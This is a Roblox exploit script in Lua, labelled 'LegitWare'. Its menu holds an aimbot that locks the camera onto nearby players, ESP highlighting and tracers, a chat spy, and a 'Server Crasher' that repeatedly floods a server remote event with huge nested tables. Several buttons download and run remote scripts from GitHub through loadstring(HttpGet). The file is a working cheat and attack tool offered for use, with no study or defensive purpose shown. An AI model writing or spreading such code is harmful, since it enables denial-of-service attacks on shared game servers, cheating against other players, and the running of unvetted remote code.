local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "LegitWare",IntroText = "LegitWare", HidePremium = false, SaveConfig = true, ConfigFolder = "LegitConfig"})
 
local General = Window:MakeTab({
	Name = "General",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

General:AddButton({
	Name = "Aimbot | Press Q",
	Callback = function()
        getgenv().prediction = 0.102
getgenv().offset = 0.6
getgenv().resolver = false
getgenv().smoothness = 1

local players = game:GetService("Players")
local localplayer = players.LocalPlayer
local mouse = localplayer:GetMouse()
local userinputservice = game:GetService("UserInputService")
local runservice = game:GetService("RunService")
local currentCamera = workspace.CurrentCamera

local victim = nil
local targeting = false

local function target()
local target = nil
local shortdistance = math.huge

for _, v in next, workspace:GetDescendants() do
if v.Parent and v:IsA("Model") and v ~= localplayer.Character then
if v:FindFirstChildOfClass("Humanoid") then
if v:FindFirstChildOfClass("Humanoid").Health > 0 then

pcall(function()
local worldtoviewportpoint, onscreen = currentCamera:WorldToViewportPoint(v:FindFirstChildOfClass("Humanoid").RootPart.Position or v.PrimaryPart.Position)
local distance = (Vector2.new(mouse.X, mouse.Y) - Vector2.new(worldtoviewportpoint.X, worldtoviewportpoint.Y)).Magnitude

if math.huge > distance and distance < shortdistance and onscreen then
target = v
shortdistance = distance
end
end)
end
end
end
end
return target and (target.PrimaryPart or target:FindFirstChildOfClass("Humanoid").RootPart)
end

userinputservice.InputBegan:Connect(function(input, processed)
if processed then
return
end

if input.KeyCode == Enum.KeyCode.Q then
targeting = not targeting

if targeting then
victim = target()
else
if victim ~= nil then
victim = nil
end
end
end
end)

local velocity = Vector3.new(0,0,0)
local oldpos = Vector3.new(0,0,0)

runservice.Heartbeat:Connect(function(deltaTime)
if victim and victim.Parent then
local currentpos = victim.Position
local displacement = currentpos - oldpos

local vector = displacement / deltaTime

velocity = velocity:Lerp(Vector3.new(
vector.X,
vector.Y*0.94*getgenv().offset,
vector.Z
), 0.4)

oldpos = currentpos
end
end)

runservice.RenderStepped:Connect(function()
local pos

if targeting and victim and victim.Parent then
if victim.Parent:FindFirstChildOfClass("Humanoid") then
if victim.Parent:FindFirstChildOfClass("Humanoid").Health > 0 then

if getgenv().usePrediction then
if getgenv().resolver then
pos = Vector3.new(
victim.Position.X,
victim.Position.Y,
victim.Position.Z) + (velocity * getgenv().prediction)
else
pos = Vector3.new(
victim.Position.X,
victim.Position.Y,
victim.Position.Z) + (victim.velocity * getgenv().prediction)
end
else
pos = Vector3.new(victim.Position.X,
victim.Position.Y,
victim.Position.Z)
end

currentCamera.CFrame = currentCamera.CFrame:Lerp(CFrame.new(currentCamera.CFrame.Position, pos), getgenv().smoothness)
end
end
end
end)
  	end    
})

local Visual = Window:MakeTab({
	Name = "Visual",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Visual:AddButton({
	Name = "Tracers",
	Callback = function()
        pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/networkcatwork/dagood/main/esp.lua"))() end)
  	end    
})

Visual:AddButton({
	Name = "Remove ESP",
	Callback = function()
local Players = game:GetService("Players")

local function removeHighlightFromCharacter(character)
    local charHighlight = character:FindFirstChild("Highlight")
    if charHighlight then
        charHighlight:Destroy()
    end
end

local function removeAllHighlights()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Character then
            removeHighlightFromCharacter(player.Character)
        end
        player.CharacterAdded:Connect(function(character)
            removeHighlightFromCharacter(character)
        end)
    end
end

removeAllHighlights()

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        removeHighlightFromCharacter(character)
    end)
end)

Players.PlayerRemoving:Connect(function(player)
    if player.Character then
        removeHighlightFromCharacter(player.Character)
    end
end)

  	end    
})

Visual:AddButton({
	Name = "ESP",
	Callback = function()
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local highlight = Instance.new("Highlight")
highlight.Name = "Highlight"

local function highlightCharacter(character)
    if not character:FindFirstChild("Highlight") then
        local charHighlight = highlight:Clone()
        charHighlight.Parent = character
    end
end

local function removeHighlightFromCharacter(character)
    local charHighlight = character:FindFirstChild("Highlight")
    if charHighlight then
        charHighlight:Destroy()
    end
end

local function highlightAllPlayers()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Character then
            highlightCharacter(player.Character)
        end
        player.CharacterAdded:Connect(function(character)
            highlightCharacter(character)
        end)
    end
end

local function removeAllHighlights()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Character then
            removeHighlightFromCharacter(player.Character)
        end
        player.CharacterAdded:Connect(function(character)
            removeHighlightFromCharacter(character)
        end)
    end
end

highlightAllPlayers()

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        highlightCharacter(character)
    end)
end)

Players.PlayerRemoving:Connect(function(player)
    if player.Character then
        removeHighlightFromCharacter(player.Character)
    end
end)
  	end    
})


Visual:AddButton({
	Name = "Chat Spy",
	Callback = function()
        local ChatFrame = game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame 
        ChatFrame.ChatChannelParentFrame.Visible = true 
        ChatFrame.ChatBarParentFrame.Position = ChatFrame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), ChatFrame.ChatChannelParentFrame.Size.Y)
  	end    
})

local OP = Window:MakeTab({
	Name = "Over Powered",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

OP:AddButton({
	Name = "Server Crasher",
	Callback = function()
        while wait(0.6) do
            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
            local function getmaxvalue(val)
               local mainvalueifonetable = 499999
               if type(val) ~= "number" then
                   return nil
               end
               local calculateperfectval = (mainvalueifonetable/(val+2))
               return calculateperfectval
            end
            
            local function bomb(tableincrease, tries)
            local maintable = {}
            local spammedtable = {}
            
            table.insert(spammedtable, {})
            z = spammedtable[1]
            
            for i = 1, tableincrease do
                local tableins = {}
                table.insert(z, tableins)
                z = tableins
            end
            
            local calculatemax = getmaxvalue(tableincrease)
            local maximum
            
            if calculatemax then
                 maximum = calculatemax
                 else
                 maximum = 999999
            end
            
            for i = 1, maximum do
                 table.insert(maintable, spammedtable)
            end
            
            for i = 1, tries do
                 game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
            end
            end
            
            bomb(250, 2) 
            end
  	end    
})

local Extras = Window:MakeTab({
     Name = "Extra",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })

 Extras:AddButton({
     Name = "Admin",
     Default = false,
     Callback = function(Value)
         loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))
     end   
 })

 Extras:AddButton({
     Name = "DarkDex",
     Default = false,
     Callback = function(Value)
       loadstring(game:HttpGet('https://raw.githubusercontent.com/TacticalBFG/HelicityScripts/master/darkdex.lua'))
     end   
 })

 Extras:AddButton({
     Name = "Air Swim",
     Default = false,
     Callback = function(Value)
         loadstring(game:HttpGet('https://raw.githubusercontent.com/HeyGyt/airswim/main/main'))
     end   
 })
 Extras:AddButton({
     Name = "Infinite Jump",
     Default = false,
     Callback = function(Value)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/HeyGyt/infjump/main/main'))
     end   
 }) 

 Extras:AddButton({
     Name = "BTools",
     Default = false,
     Callback = function(Value)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/HeyGyt/btools/main/main'))
     end   
 })

OrionLib:Init()
